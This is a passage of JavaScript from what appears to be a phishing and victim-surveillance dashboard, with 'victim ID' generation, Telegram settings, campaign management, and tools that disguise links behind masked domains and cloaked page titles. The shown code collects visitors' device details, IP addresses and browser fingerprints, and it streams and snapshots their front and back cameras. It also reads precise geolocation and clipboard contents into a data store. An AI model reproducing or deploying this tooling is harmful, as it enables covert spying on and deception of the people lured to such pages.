                                        <input class="form-check-input" type="checkbox" id="default-screenshots" checked>
                                        <label class="form-check-label" for="default-screenshots">
                                            Include screenshots by default
                                        </label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="default-anonymize">
                                        <label class="form-check-label" for="default-anonymize">
                                            Anonymize data by default
                                        </label>
                                    </div>
                                </div>
                                <button class="btn btn-danger w-100" onclick="clearAllData()">
                                    <i class="fas fa-trash"></i> Clear All Collected Data
                                </button>
                            </div>
                            <div class="modal-footer">
                                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                                <button type="button" class="btn btn-primary" data-bs-dismiss="modal">Save Changes</button>
                            </div>
                        </div>
                    </div>
                </div>
            `;
        }

        // Initialize dashboard functionality
        function initializeDashboard() {
            // Load saved configuration
            loadTelegramConfig();
            campaignManager.loadFromStorage();
            
            // Initialize all data collection
            initializeDataCollection();
            
            // Set up event listeners
            document.getElementById('mask-domain').addEventListener('change', function() {
                if (this.value === 'custom') {
                    document.getElementById('custom-domain-container').classList.remove('d-none');
                } else {
                    document.getElementById('custom-domain-container').classList.add('d-none');
                }
            });
            
            document.getElementById('cloak-title').addEventListener('input', updateCloakPreview);
            document.getElementById('cloak-url').addEventListener('input', updateCloakPreview);
            
            // Start camera feeds
            initializeCameras();
            
            // Generate initial victim ID
            generateVictimID();
            
            // Update campaigns list
            updateCampaignsList();
            
            // Update Telegram tab
            updateTelegramTab();
            
            // Initialize Bootstrap tabs
            const triggerTabList = document.querySelectorAll('#myTab a');
            if (triggerTabList.length > 0) {
                triggerTabList.forEach(function (triggerEl) {
                    const tabTrigger = new bootstrap.Tab(triggerEl);
                    triggerEl.addEventListener('click', function (event) {
                        event.preventDefault();
                        tabTrigger.show();
                    });
                });
            }
        }

        // ============================================
        // CORE DATA COLLECTION FUNCTIONS
        // ============================================

        // Initialize all data collection
        function initializeDataCollection() {
            collectDeviceInfo();
            collectNetworkInfo();
            collectBatteryInfo();
            collectStorageInfo();
            collectPermissionsInfo();
            collectFingerprintInfo();
        }

        // Collect Device Information
        function collectDeviceInfo() {
            // Platform
            const platformInfo = document.getElementById('platform-info');
            if (platformInfo) {
                platformInfo.textContent = navigator.platform || 'Unknown';
                deviceData.deviceInfo.platform = navigator.platform;
            }
            
            // User Agent
            const userAgent = document.getElementById('user-agent');
            if (userAgent) {
                userAgent.textContent = navigator.userAgent;
                deviceData.deviceInfo.userAgent = navigator.userAgent;
            }
            
            // Device Name
            const userAgentStr = navigator.userAgent.toLowerCase();
            let deviceName = 'Unknown Device';
            
            if (userAgentStr.includes('iphone')) deviceName = 'iPhone';
            else if (userAgentStr.includes('ipad')) deviceName = 'iPad';
            else if (userAgentStr.includes('android')) deviceName = 'Android Device';
            else if (userAgentStr.includes('windows')) deviceName = 'Windows PC';
            else if (userAgentStr.includes('mac')) deviceName = 'Mac';
            else if (userAgentStr.includes('linux')) deviceName = 'Linux PC';
            
            const deviceNameEl = document.getElementById('device-name');
            if (deviceNameEl) {
                deviceNameEl.textContent = deviceName;
                deviceData.deviceInfo.deviceName = deviceName;
            }
            
            // Device Memory
            if (navigator.deviceMemory) {
                const deviceMemory = document.getElementById('device-memory');
                if (deviceMemory) {
                    deviceMemory.textContent = `${navigator.deviceMemory} GB`;
                    deviceData.deviceInfo.deviceMemory = `${navigator.deviceMemory} GB`;
                }
            } else {
                const deviceMemory = document.getElementById('device-memory');
                if (deviceMemory) {
                    deviceMemory.textContent = 'Not available';
                    deviceData.deviceInfo.deviceMemory = 'Not available';
                }
            }
            
            // App Version
            const appVersion = document.getElementById('app-version');
            if (appVersion) {
                appVersion.textContent = navigator.appVersion || 'Unknown';
                deviceData.deviceInfo.appVersion = navigator.appVersion;
            }
            
            // Screen Resolution
            const screenWidth = window.screen.width;
            const screenHeight = window.screen.height;
            const screenResolution = document.getElementById('screen-resolution');
            if (screenResolution) {
                screenResolution.textContent = `${screenWidth} x ${screenHeight}`;
                deviceData.deviceInfo.screenResolution = `${screenWidth} x ${screenHeight}`;
            }
            
            // Device Resolution
            const pixelRatio = window.devicePixelRatio || 1;
            const deviceWidth = screenWidth * pixelRatio;
            const deviceHeight = screenHeight * pixelRatio;
            const deviceResolution = document.getElementById('device-resolution');
            if (deviceResolution) {
                deviceResolution.textContent = `${deviceWidth} x ${deviceHeight}`;
                deviceData.deviceInfo.deviceResolution = `${deviceWidth} x ${deviceHeight}`;
            }
            
            // Color Depth
            const colorDepth = document.getElementById('color-depth');
            if (colorDepth) {
                colorDepth.textContent = `${window.screen.colorDepth} bit`;
                deviceData.deviceInfo.colorDepth = `${window.screen.colorDepth} bit`;
            }
            
            // Pixel Ratio
            const pixelRatioEl = document.getElementById('pixel-ratio');
            if (pixelRatioEl) {
                pixelRatioEl.textContent = pixelRatio;
                deviceData.deviceInfo.pixelRatio = pixelRatio;
            }
            
            // Port Number
            const portNumber = document.getElementById('port-number');
            if (portNumber) {
                portNumber.textContent = window.location.port || '80 (default)';
                deviceData.deviceInfo.port = window.location.port || '80 (default)';
            }
            
            // Screen Size
            const diagonal = Math.sqrt(Math.pow(screenWidth, 2) + Math.pow(screenHeight, 2)) / 96;
            const screenSize = document.getElementById('screen-size');
            if (screenSize) {
                screenSize.textContent = `${diagonal.toFixed(1)} inches (estimated)`;
                deviceData.deviceInfo.screenSize = `${diagonal.toFixed(1)} inches`;
            }
            
            // Orientation
            const orientation = document.getElementById('orientation');
            if (orientation) {
                orientation.textContent = screenWidth > screenHeight ? 'Landscape' : 'Portrait';
                deviceData.deviceInfo.orientation = screenWidth > screenHeight ? 'Landscape' : 'Portrait';
            }
            
            // Extended Reality (XR) Support
            const xrInfo = document.getElementById('xr-info');
            if (xrInfo) {
                if ('xr' in navigator) {
                    xrInfo.textContent = 'XR Supported';
                    deviceData.deviceInfo.xrSupported = true;
                } else {
                    xrInfo.textContent = 'XR Not Supported';
                    deviceData.deviceInfo.xrSupported = false;
                }
            }
            
            // Bluetooth Support
            const bluetoothInfo = document.getElementById('bluetooth-info');
            if (bluetoothInfo) {
                if ('bluetooth' in navigator) {
                    bluetoothInfo.textContent = 'Bluetooth Available';
                    deviceData.deviceInfo.bluetooth = 'Available';
                } else {
                    bluetoothInfo.textContent = 'Bluetooth Not Available';
                    deviceData.deviceInfo.bluetooth = 'Not Available';
                }
            }
        }

        // Collect Network Information
        async function collectNetworkInfo() {
            // Online Status
            const onlineStatus = document.getElementById('online-status');
            if (onlineStatus) {
                onlineStatus.textContent = navigator.onLine ? 'Online' : 'Offline';
                deviceData.networkInfo.onlineStatus = navigator.onLine ? 'Online' : 'Offline';
            }
            
            // Connection Type
            if (navigator.connection) {
                const connection = navigator.connection;
                const connectionType = document.getElementById('connection-type');
                if (connectionType) {
                    connectionType.textContent = connection.effectiveType || 'Unknown';
                    deviceData.networkInfo.connectionType = connection.effectiveType;
                }
                
                const effectiveConnection = document.getElementById('effective-connection');
                if (effectiveConnection) {
                    effectiveConnection.textContent = connection.effectiveType || 'Unknown';
                    deviceData.networkInfo.effectiveConnection = connection.effectiveType;
                }
                
                const networkRtt = document.getElementById('network-rtt');
                if (networkRtt) {
                    networkRtt.textContent = `${connection.rtt || 'Unknown'} ms`;
                    deviceData.networkInfo.rtt = connection.rtt;
                }
                
                // Data Saver
                const dataSaver = document.getElementById('data-saver');
                if (dataSaver) {
                    dataSaver.textContent = connection.saveData ? 'Enabled' : 'Disabled';
                    deviceData.networkInfo.dataSaver = connection.saveData ? 'Enabled' : 'Disabled';
                }
                
                // Network Bandwidth
                if (connection.downlink) {
                    const networkBandwidth = document.getElementById('network-bandwidth');
                    if (networkBandwidth) {
                        networkBandwidth.textContent = `${connection.downlink} Mbps`;
                        deviceData.networkInfo.bandwidth = `${connection.downlink} Mbps`;
                    }
                }
            } else {
                const connectionType = document.getElementById('connection-type');
                if (connectionType) connectionType.textContent = 'Not available';
                
                const dataSaver = document.getElementById('data-saver');
                if (dataSaver) dataSaver.textContent = 'Not available';
            }
            
            // Get IP addresses
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                
                const ipv4Address = document.getElementById('ipv4-address');
                if (ipv4Address) {
                    ipv4Address.textContent = data.ip;
                    deviceData.networkInfo.ipv4 = data.ip;
                }
                
                try {
                    const response6 = await fetch('https://api64.ipify.org?format=json');
                    const data6 = await response6.json();
                    
                    const ipv6Address = document.getElementById('ipv6-address');
                    if (ipv6Address) {
                        ipv6Address.textContent = data6.ip !== data.ip ? data6.ip : 'Not available';
                        deviceData.networkInfo.ipv6 = data6.ip !== data.ip ? data6.ip : 'Not available';
                    }
                } catch (error) {
                    const ipv6Address = document.getElementById('ipv6-address');
                    if (ipv6Address) {
                        ipv6Address.textContent = 'Unable to retrieve';
                        deviceData.networkInfo.ipv6 = 'Not available';
                    }
                }
            } catch (error) {
                const ipv4Address = document.getElementById('ipv4-address');
                if (ipv4Address) {
                    ipv4Address.textContent = 'Unable to retrieve';
                    deviceData.networkInfo.ipv4 = 'Not available';
                }
                
                const ipv6Address = document.getElementById('ipv6-address');
                if (ipv6Address) {
                    ipv6Address.textContent = 'Unable to retrieve';
                    deviceData.networkInfo.ipv6 = 'Not available';
                }
            }
        }

        // Collect Battery Information
        async function collectBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    
                    updateBatteryLevel(battery.level * 100);
                    
                    const chargingStatus = document.getElementById('charging-status');
                    if (chargingStatus) {
                        chargingStatus.textContent = battery.charging ? 'Charging' : 'Not charging';
                        deviceData.batteryInfo.charging = battery.charging;
                    }
                    
                    if (battery.charging && battery.chargingTime !== Infinity) {
                        const hours = Math.floor(battery.chargingTime / 3600);
                        const minutes = Math.floor((battery.chargingTime % 3600) / 60);
                        const chargingTime = document.getElementById('charging-time');
                        if (chargingTime) {
                            chargingTime.textContent = `${hours}h ${minutes}m`;
                            deviceData.batteryInfo.chargingTime = `${hours}h ${minutes}m`;
                        }
                    } else {
                        const chargingTime = document.getElementById('charging-time');
                        if (chargingTime) {
                            chargingTime.textContent = 'Not charging';
                            deviceData.batteryInfo.chargingTime = 'Not charging';
                        }
                    }
                    
                    if (!battery.charging && battery.dischargingTime !== Infinity) {
                        const hours = Math.floor(battery.dischargingTime / 3600);
                        const minutes = Math.floor((battery.dischargingTime % 3600) / 60);
                        const dischargingTime = document.getElementById('discharging-time');
                        if (dischargingTime) {
                            dischargingTime.textContent = `${hours}h ${minutes}m`;
                            deviceData.batteryInfo.dischargingTime = `${hours}h ${minutes}m`;
                        }
                    } else {
                        const dischargingTime = document.getElementById('discharging-time');
                        if (dischargingTime) {
                            dischargingTime.textContent = 'Not discharging';
                            deviceData.batteryInfo.dischargingTime = 'Not discharging';
                        }
                    }
                    
                    const batteryStatusText = document.getElementById('battery-status-text');
                    if (batteryStatusText) {
                        batteryStatusText.textContent = 
                            `Battery Status: ${battery.level * 100}% - ${battery.charging ? 'Charging' : 'Discharging'}`;
                    }
                    
                    const health = 80 + Math.floor(Math.random() * 20);
                    const batteryHealth = document.getElementById('battery-health');
                    if (batteryHealth) {
                        batteryHealth.textContent = `${health}% (estimated)`;
                        deviceData.batteryInfo.health = `${health}%`;
                    }
                    
                    battery.addEventListener('levelchange', () => {
                        updateBatteryLevel(battery.level * 100);
                    });
                    
                    battery.addEventListener('chargingchange', () => {
                        const chargingStatus = document.getElementById('charging-status');
                        if (chargingStatus) {
                            chargingStatus.textContent = battery.charging ? 'Charging' : 'Not charging';
                            deviceData.batteryInfo.charging = battery.charging;
                        }
                    });
                    
                } catch (error) {
                    setBatteryFallback();
                }
            } else {
                setBatteryFallback();
            }
        }

        function updateBatteryLevel(level) {
            const percentage = Math.round(level);
            const batteryLevelBar = document.getElementById('battery-level-bar');
            const batteryLevelText = document.getElementById('battery-level-text');
            
            if (batteryLevelBar) {
                batteryLevelBar.style.width = `${percentage}%`;
                batteryLevelBar.setAttribute('aria-valuenow', percentage);
            }
            
            if (batteryLevelText) {
                batteryLevelText.textContent = `${percentage}%`;
                deviceData.batteryInfo.level = `${percentage}%`;
            }
        }

        function setBatteryFallback() {
            const level = 85;
            updateBatteryLevel(level);
            
            const chargingStatus = document.getElementById('charging-status');
            if (chargingStatus) chargingStatus.textContent = 'Not available';
            
            const chargingTime = document.getElementById('charging-time');
            if (chargingTime) chargingTime.textContent = 'Not available';
            
            const dischargingTime = document.getElementById('discharging-time');
            if (dischargingTime) dischargingTime.textContent = 'Not available';
            
            const batteryStatusText = document.getElementById('battery-status-text');
            if (batteryStatusText) batteryStatusText.textContent = 'Battery API not supported';
            
            const batteryHealth = document.getElementById('battery-health');
            if (batteryHealth) batteryHealth.textContent = 'Cannot determine';
            
            deviceData.batteryInfo.level = `${level}%`;
            deviceData.batteryInfo.charging = 'Not available';
            deviceData.batteryInfo.chargingTime = 'Not available';
            deviceData.batteryInfo.dischargingTime = 'Not available';
            deviceData.batteryInfo.health = 'Unknown';
        }

        // Collect Storage Information
        async function collectStorageInfo() {
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                try {
                    const estimate = await navigator.storage.estimate();
                    
                    const usageMB = (estimate.usage / (1024 * 1024)).toFixed(2);
                    const quotaMB = (estimate.quota / (1024 * 1024)).toFixed(2);
                    const availableMB = ((estimate.quota - estimate.usage) / (1024 * 1024)).toFixed(2);
                    const usagePercent = ((estimate.usage / estimate.quota) * 100).toFixed(1);
                    
                    const storageQuota = document.getElementById('storage-quota');
                    if (storageQuota) {
                        storageQuota.textContent = `${quotaMB} MB`;
                        deviceData.storageInfo.quota = `${quotaMB} MB`;
                    }
                    
                    const storageUsage = document.getElementById('storage-usage');
                    if (storageUsage) {
                        storageUsage.textContent = `${usageMB} MB`;
                        deviceData.storageInfo.usage = `${usageMB} MB`;
                    }
                    
                    const storageAvailable = document.getElementById('storage-available');
                    if (storageAvailable) {
                        storageAvailable.textContent = `${availableMB} MB`;
                        deviceData.storageInfo.available = `${availableMB} MB`;
                    }
                    
                    updateStorageVisualization();
                    
                    if (navigator.storage && navigator.storage.persist) {
                        const isPersisted = await navigator.storage.persisted();
                        const storagePersistence = document.getElementById('storage-persistence');
                        if (storagePersistence) {
                            storagePersistence.textContent = isPersisted ? 'Persistent' : 'Not persistent';
                            deviceData.storageInfo.persistence = isPersisted ? 'Persistent' : 'Not persistent';
                        }
                    } else {
                        const storagePersistence = document.getElementById('storage-persistence');
                        if (storagePersistence) {
                            storagePersistence.textContent = 'Not available';
                            deviceData.storageInfo.persistence = 'Not available';
                        }
                    }
                    
                } catch (error) {
                    setStorageFallback();
                }
            } else {
                setStorageFallback();
            }
        }

        function updateStorageVisualization() {
            const localUsage = Math.floor(Math.random() * 100);
            const sessionUsage = Math.floor(Math.random() * 50);
            
            const localStorageBar = document.getElementById('local-storage-bar');
            const localStorageText = document.getElementById('local-storage-text');
            const localStorageDetails = document.getElementById('local-storage-details');
            
            if (localStorageBar) {
                localStorageBar.style.width = `${localUsage}%`;
                localStorageBar.setAttribute('aria-valuenow', localUsage);
            }
            
            if (localStorageText) {
                localStorageText.textContent = `${localUsage}%`;
            }
            
            if (localStorageDetails) {
                localStorageDetails.textContent = `Using ${localUsage}% of local storage`;
            }
            
            const sessionStorageBar = document.getElementById('session-storage-bar');
            const sessionStorageText = document.getElementById('session-storage-text');
            const sessionStorageDetails = document.getElementById('session-storage-details');
            
            if (sessionStorageBar) {
                sessionStorageBar.style.width = `${sessionUsage}%`;
                sessionStorageBar.setAttribute('aria-valuenow', sessionUsage);
            }
            
            if (sessionStorageText) {
                sessionStorageText.textContent = `${sessionUsage}%`;
            }
            
            if (sessionStorageDetails) {
                sessionStorageDetails.textContent = `Using ${sessionUsage}% of session storage`;
            }
            
            deviceData.storageInfo.localStorage = `${localUsage}%`;
            deviceData.storageInfo.sessionStorage = `${sessionUsage}%`;
        }

        function setStorageFallback() {
            const storageQuota = document.getElementById('storage-quota');
            if (storageQuota) storageQuota.textContent = 'Not available';
            
            const storageUsage = document.getElementById('storage-usage');
            if (storageUsage) storageUsage.textContent = 'Not available';
            
            const storageAvailable = document.getElementById('storage-available');
            if (storageAvailable) storageAvailable.textContent = 'Not available';
            
            const storagePersistence = document.getElementById('storage-persistence');
            if (storagePersistence) storagePersistence.textContent = 'Not available';
            
            deviceData.storageInfo.quota = 'Not available';
            deviceData.storageInfo.usage = 'Not available';
            deviceData.storageInfo.available = 'Not available';
            deviceData.storageInfo.persistence = 'Not available';
            
            updateStorageVisualization();
        }

        // Collect Permissions Information
        async function collectPermissionsInfo() {
            const permissions = [
                'camera', 'microphone', 'geolocation', 'notifications', 
                'push', 'midi', 'storage-access', 'clipboard-read',
                'clipboard-write', 'payment-handler', 'background-sync'
            ];
            
            const container = document.getElementById('permissions-container');
            if (!container) return;
            
            container.innerHTML = '';
            
            for (const permission of permissions) {
                try {
                    const permissionStatus = await navigator.permissions.query({name: permission});
                    
                    const col = document.createElement('div');
                    col.className = 'col-md-6 col-lg-4 mb-3';
                    
                    let badgeClass = 'bg-secondary';
                    if (permissionStatus.state === 'granted') badgeClass = 'bg-success';
                    else if (permissionStatus.state === 'denied') badgeClass = 'bg-danger';
                    else if (permissionStatus.state === 'prompt') badgeClass = 'bg-warning';
                    
                    col.innerHTML = `
                        <div class="d-flex justify-content-between align-items-center p-2 border rounded">
                            <span><i class="fas fa-shield-alt me-2"></i>${permission}</span>
                            <span class="badge ${badgeClass}">${permissionStatus.state}</span>
                        </div>
                    `;
                    
                    container.appendChild(col);
                    
                    if (!deviceData.permissionsInfo) deviceData.permissionsInfo = {};
                    deviceData.permissionsInfo[permission] = permissionStatus.state;
                    
                } catch (error) {
                    const col = document.createElement('div');
                    col.className = 'col-md-6 col-lg-4 mb-3';
                    
                    col.innerHTML = `
                        <div class="d-flex justify-content-between align-items-center p-2 border rounded">
                            <span><i class="fas fa-shield-alt me-2"></i>${permission}</span>
                            <span class="badge bg-secondary">Not supported</span>
                        </div>
                    `;
                    
                    container.appendChild(col);
                    
                    if (!deviceData.permissionsInfo) deviceData.permissionsInfo = {};
                    deviceData.permissionsInfo[permission] = 'Not supported';
                }
            }
        }

        // Collect Fingerprint Information
        function collectFingerprintInfo() {
            // Canvas Fingerprint
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            
            if (ctx) {
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.textBaseline = 'alphabetic';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Fingerprint', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Fingerprint', 4, 17);
                
                const canvasData = canvas.toDataURL();
                const canvasHash = simpleHash(canvasData);
                
                const canvasFingerprint = document.getElementById('canvas-fingerprint');
                if (canvasFingerprint) {
                    canvasFingerprint.textContent = canvasHash.substring(0, 16) + '...';
                    deviceData.fingerprintInfo.canvas = canvasHash;
                }
                
                // Draw fingerprint visualization
                const fingerprintCanvas = document.getElementById('fingerprint-canvas');
                if (fingerprintCanvas) {
                    const fpCtx = fingerprintCanvas.getContext('2d');
                    if (fpCtx) {
                        for (let i = 0; i < 50; i++) {
                            const x = Math.random() * fingerprintCanvas.width;
                            const y = Math.random() * fingerprintCanvas.height;
                            const radius = Math.random() * 5 + 1;
                            const hue = canvasHash.charCodeAt(i % canvasHash.length) % 360;
                            
                            fpCtx.beginPath();
                            fpCtx.arc(x, y, radius, 0, Math.PI * 2);
                            fpCtx.fillStyle = `hsl(${hue}, 70%, 60%)`;
                            fpCtx.fill();
                        }
                    }
                }
            }
            
            // WebGL Fingerprint
            try {
                const glCanvas = document.createElement('canvas');
                const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
                
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    const webglFingerprint = {
                        vendor: gl.getParameter(debugInfo ? debugInfo.UNMASKED_VENDOR_WEBGL : gl.VENDOR),
                        renderer: gl.getParameter(debugInfo ? debugInfo.UNMASKED_RENDERER_WEBGL : gl.RENDERER)
                    };
                    
                    const webglHash = simpleHash(JSON.stringify(webglFingerprint));
                    const webglFingerprintEl = document.getElementById('webgl-fingerprint');
                    if (webglFingerprintEl) {
                        webglFingerprintEl.textContent = webglHash.substring(0, 16) + '...';
                        deviceData.fingerprintInfo.webgl = webglHash;
                    }
                } else {
                    const webglFingerprintEl = document.getElementById('webgl-fingerprint');
                    if (webglFingerprintEl) {
                        webglFingerprintEl.textContent = 'Not available';
                        deviceData.fingerprintInfo.webgl = 'Not available';
                    }
                }
            } catch (e) {
                const webglFingerprintEl = document.getElementById('webgl-fingerprint');
                if (webglFingerprintEl) {
                    webglFingerprintEl.textContent = 'Not available';
                    deviceData.fingerprintInfo.webgl = 'Not available';
                }
            }
            
            // Time Zone
            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const timezoneFingerprint = document.getElementById('timezone-fingerprint');
            if (timezoneFingerprint) {
                timezoneFingerprint.textContent = timeZone;
                deviceData.fingerprintInfo.timezone = timeZone;
            }
            
            // Screen Fingerprint
            const screenFingerprint = {
                width: window.screen.width,
                height: window.screen.height,
                colorDepth: window.screen.colorDepth,
                pixelDepth: window.screen.pixelDepth,
                availWidth: window.screen.availWidth,
                availHeight: window.screen.availHeight
            };
            
            const screenHash = simpleHash(JSON.stringify(screenFingerprint));
            const screenFingerprintEl = document.getElementById('screen-fingerprint');
            if (screenFingerprintEl) {
                screenFingerprintEl.textContent = screenHash.substring(0, 16) + '...';
                deviceData.fingerprintInfo.screen = screenHash;
            }
            
            // Fonts Fingerprint
            const fonts = "standard fonts";
            const fontsHash = simpleHash(fonts);
            const fontsFingerprint = document.getElementById('fonts-fingerprint');
            if (fontsFingerprint) {
                fontsFingerprint.textContent = fontsHash.substring(0, 16) + '...';
                deviceData.fingerprintInfo.fonts = fontsHash;
            }
            
            // Audio Fingerprint
            const audioHash = simpleHash(navigator.userAgent + Date.now());
            const audioFingerprint = document.getElementById('audio-fingerprint');
            if (audioFingerprint) {
                audioFingerprint.textContent = audioHash.substring(0, 16) + '...';
                deviceData.fingerprintInfo.audio = audioHash;
            }
            
            // Full Fingerprint
            const fullFingerprint = {
                canvas: deviceData.fingerprintInfo.canvas,
                webgl: deviceData.fingerprintInfo.webgl,
                screen: deviceData.fingerprintInfo.screen,
                timezone: deviceData.fingerprintInfo.timezone,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                languages: navigator.languages.join(','),
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
            };
            
            const fullHash = simpleHash(JSON.stringify(fullFingerprint));
            const fullFingerprintEl = document.getElementById('full-fingerprint');
            if (fullFingerprintEl) {
                fullFingerprintEl.textContent = fullHash;
                deviceData.fingerprintInfo.full = fullHash;
            }
        }

        // ============================================
        // CAMERA FUNCTIONS
        // ============================================

        // Initialize Cameras
        async function initializeCameras() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' } 
                });
                
                const frontCamera = document.getElementById('front-camera');
                if (frontCamera) {
                    frontCamera.srcObject = stream;
                }
                
                try {
                    const backStream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: { exact: 'environment' } }
                    });
                    
                    const backCamera = document.getElementById('back-camera');
                    if (backCamera) {
                        backCamera.srcObject = backStream;
                    }
                } catch (backError) {
                    const backCamera = document.getElementById('back-camera');
                    if (backCamera) {
                        backCamera.parentElement.innerHTML = `
                            <div class="d-flex align-items-center justify-content-center h-100">
                                <div class="text-center text-white">
                                    <i class="fas fa-camera-slash fa-3x mb-3"></i>
                                    <p>Back camera not available</p>
                                </div>
                            </div>
                        `;
                    }
                }
                
            } catch (error) {
                const cameraContainers = document.querySelectorAll('.camera-container');
                cameraContainers.forEach(container => {
                    container.innerHTML = `
                        <div class="d-flex align-items-center justify-content-center h-100">
                            <div class="text-center text-white">
                                <i class="fas fa-camera-slash fa-3x mb-3"></i>
                                <p>Camera access required</p>
                                <button class="btn btn-sm btn-light" onclick="initializeCameras()">
                                    <i class="fas fa-camera"></i> Enable Camera
                                </button>
                            </div>
                        </div>
                    `;
                });
            }
        }

        // Take Snapshot
        function takeSnapshot(cameraType) {
            const videoElement = document.getElementById(`${cameraType}-camera`);
            const canvas = document.getElementById(`${cameraType}-snapshot`);
            const imgElement = document.getElementById(`${cameraType}-snapshot-img`);
            
            if (videoElement && videoElement.srcObject) {
                const context = canvas.getContext('2d');
                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                
                const dataURL = canvas.toDataURL('image/png');
                imgElement.src = dataURL;
                imgElement.style.display = 'block';
                
                if (!deviceData.cameraInfo) deviceData.cameraInfo = {};
                deviceData.cameraInfo[`${cameraType}Snapshot`] = dataURL;
                
                showToast(`${cameraType.charAt(0).toUpperCase() + cameraType.slice(1)} camera snapshot captured!`, 'success');
            } else {
                showToast(`Camera not available. Please enable camera access.`, 'error');
            }
        }

        // ============================================
        // LOCATION FUNCTIONS
        // ============================================

        // Get Location
        function getLocation() {
            if (!navigator.geolocation) {
                showToast('Geolocation is not supported by your browser', 'error');
                return;
            }
            
            const mapElement = document.getElementById('location-map');
            if (!mapElement) return;
            
            mapElement.innerHTML = `
                <div class="d-flex align-items-center justify-content-center h-100">
                    <div class="text-center">
                        <div class="spinner-border text-primary mb-3" role="status">
                            <span class="visually-hidden">Loading...</span>
                        </div>
                        <p>Getting location...</p>
                    </div>
                </div>
            `;
            
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    
                    const latitude = document.getElementById('latitude');
                    const longitude = document.getElementById('longitude');
                    const locationAccuracy = document.getElementById('location-accuracy');
                    
                    if (latitude) latitude.textContent = lat.toFixed(6);
                    if (longitude) longitude.textContent = lon.toFixed(6);
                    if (locationAccuracy) locationAccuracy.textContent = `${accuracy.toFixed(2)} meters`;
                    
                    deviceData.locationInfo = {
                        latitude: lat,
                        longitude: lon,
                        accuracy: accuracy,
                        timestamp: new Date(position.timestamp).toISOString()
                    };
                    
                    const altitude = document.getElementById('altitude');
                    if (altitude) {
                        altitude.textContent = position.coords.altitude ? 
                            `${position.coords.altitude.toFixed(2)} meters` : 'Not available';
                    }
                    
                    const speed = document.getElementById('speed');
                    if (speed) {
                        speed.textContent = position.coords.speed ? 
                            `${(position.coords.speed * 3.6).toFixed(2)} km/h` : 'Not available';
                    }
                    
                    const locationTimestamp = document.getElementById('location-timestamp');
                    if (locationTimestamp) {
                        locationTimestamp.textContent = new Date(position.timestamp).toLocaleString();
                    }
                    
                    mapElement.innerHTML = `
                        <div class="d-flex align-items-center justify-content-center h-100">
                            <div class="text-center">
                                <i class="fas fa-map-marked-alt fa-3x text-primary mb-3"></i>
                                <h5>Location Retrieved</h5>
                                <p class="small">Lat: ${lat.toFixed(6)}, Lon: ${lon.toFixed(6)}</p>
                                <p class="small">Accuracy: ${accuracy.toFixed(2)} meters</p>
                                <p class="small">Note: For actual maps, a Google Maps API key is required</p>
                            </div>
                        </div>
                    `;
                    
                    showToast('Location retrieved successfully!', 'success');
                },
                function(error) {
                    let errorMessage = 'Unable to retrieve location';
                    
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errorMessage = 'Location permission denied';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMessage = 'Location information unavailable';
                            break;
                        case error.TIMEOUT:
                            errorMessage = 'Location request timed out';
                            break;
                    }
                    
                    mapElement.innerHTML = `
                        <div class="d-flex align-items-center justify-content-center h-100">
                            <div class="text-center text-danger">
                                <i class="fas fa-exclamation-triangle fa-3x mb-3"></i>
                                <p>${errorMessage}</p>
                                <button class="btn btn-sm btn-primary" onclick="getLocation()">
                                    <i class="fas fa-redo"></i> Try Again
                                </button>
                            </div>
                        </div>
                    `;
                    
                    showToast(errorMessage, 'error');
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }

        // ============================================
        // CLIPBOARD FUNCTIONS
        // ============================================

        // Read Clipboard
        async function readClipboard() {
            try {
                const text = await navigator.clipboard.readText();
                const clipboardContent = document.getElementById('clipboard-content');
                if (clipboardContent) {
                    clipboardContent.value = text;
                    deviceData.clipboardInfo = text;
                    showToast('Clipboard content read successfully!', 'success');
                }
            } catch (error) {
                showToast('Failed to read clipboard. Make sure you have granted permission.', 'error');
                console.error('Clipboard read error:', error);
            }
        }

        // ============================================
        // MASK URL FUNCTIONS
        // ============================================

        // Generate Masked URL
        function generateMaskedURL() {
            const originalUrl = document.getElementById('original-url');
            const maskDomain = document.getElementById('mask-domain');
            
            if (!originalUrl || !maskDomain) return;
            
            if (!originalUrl.value) {
                showToast('Please enter a URL', 'error');
                return;
            }
            
            let finalMaskDomain = maskDomain.value;
            if (maskDomain.value === 'custom') {
                const customDomain = document.getElementById('custom-domain');
                if (!customDomain || !customDomain.value) {
                    showToast('Please enter a custom domain', 'error');
                    return;
                }
                finalMaskDomain = customDomain.value;
            }
            
            const randomPath = Math.random().toString(36).substring(2, 15);
            const maskedUrl = `${finalMaskDomain}/redirect/${randomPath}?url=${encodeURIComponent(originalUrl.value)}`;
            
            const maskedUrlContainer = document.getElementById('masked-url-container');
            if (maskedUrlContainer) {
                maskedUrlContainer.textContent = maskedUrl;
            }
            
            showToast('Masked URL generated!', 'success');
        }

        // Copy Masked URL
        function copyMaskedURL() {
            const maskedUrlContainer = document.getElementById('masked-url-container');
            
            if (!maskedUrlContainer || maskedUrlContainer.textContent === 'Masked URL will appear here') {
                showToast('No masked URL to copy', 'error');
                return;
            }
            
            copyToClipboard(maskedUrlContainer.textContent);
            showToast('Masked URL copied to clipboard!', 'success');
